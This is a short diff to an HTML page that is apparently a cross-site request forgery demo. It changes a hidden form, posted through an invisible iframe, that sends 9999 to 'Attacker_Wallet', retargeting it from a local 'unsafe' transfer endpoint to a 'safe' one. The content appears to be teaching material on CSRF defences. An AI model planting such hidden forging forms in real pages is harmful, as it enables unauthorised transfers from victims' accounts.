@@ -25,7 +25,7 @@
     <iframe name="stealth-frame" style="display: none;"></iframe>
 
     <!-- Hidden form attacking the SAFE endpoint for the final demo -->
-    <form id="steal-money-form" action="http://localhost:3000/transfer/unsafe" method="POST" target="stealth-frame" style="display: none;">
+    <form id="steal-money-form" action="http://localhost:3000/transfer/safe" method="POST" target="stealth-frame" style="display: none;">
         <input type="hidden" name="to" value="Attacker_Wallet">
         <input type="hidden" name="amount" value="9999">
     </form>
